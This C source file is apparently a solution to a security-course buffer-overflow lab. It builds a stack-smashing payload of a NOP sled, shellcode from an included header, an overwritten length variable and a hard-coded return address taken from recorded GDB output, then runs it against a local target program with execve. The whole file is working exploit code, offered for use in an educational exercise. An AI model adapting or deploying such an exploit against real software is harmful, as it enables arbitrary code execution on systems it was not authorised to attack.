#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	/*

	INFO FROM GDB:

		% info frame (of foo)
			Arglist at 0x2021fe50, args: arg=0x7fffffffefdc "hi there"
 			Locals at 0x2021fe50, Previous frame's sp is 0x2021fe60
 			Saved registers:
  			rbp at 0x2021fe50, rip at 0x2021fe58

  		% p &buf
  			0x2021fd40

  		% p &len
			0x2021fe4c
	
		% p &i
			0x2021fe48

		Difference between i and buf addresses is 264 bytes. We need to 
		overwrite value of len.

		Difference between instruction pointer of foo function frame and 
		start address of buf is 280 bytes.

	*/

	char exploit[283];
	memset(exploit, '\x00', 283);

	int i;

	// fill exploit with 128 bytes of NOP instructions
	for (i = 0; i < 128; i++){
		exploit[i] = '\x90';
	}

	strcat(exploit, shellcode); // append the shellcode to exploit string
	strcat(exploit, "\x90\x90\x90"); // pad the shellcode to make it word-aligned

	// fill remaining 76 bytes of NOP instructions
	for (i = 176; i < 252; i++){
		exploit[i] = '\x90';
	}

	// fill the 4 bytes with buffer start address.
		// we'll use envp argument to jump back here
	exploit[252] = '\x40';
	exploit[253] = '\xfd';
	exploit[254] = '\x21';
	exploit[255] = '\x20';

	// fill with NOP instructions till 264th byte
	for (i = 256; i < 264; i++){
		exploit[i] = '\x90';
	}

	// skip over i
	
	exploit[264] = '\x0b';
	exploit[265] = '\x01';
	exploit[266] = '\x01';
	exploit[267] = '\x01';

	// overwrite value of len to 283
	exploit[268] = '\x1b';
	exploit[269] = '\x01';
	exploit[270] = '\x00';

	args[0] = TARGET;

	args[1] = exploit;

	args[2] = NULL;

	env[0] = &exploit[270];
	env[1] = &exploit[244];

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
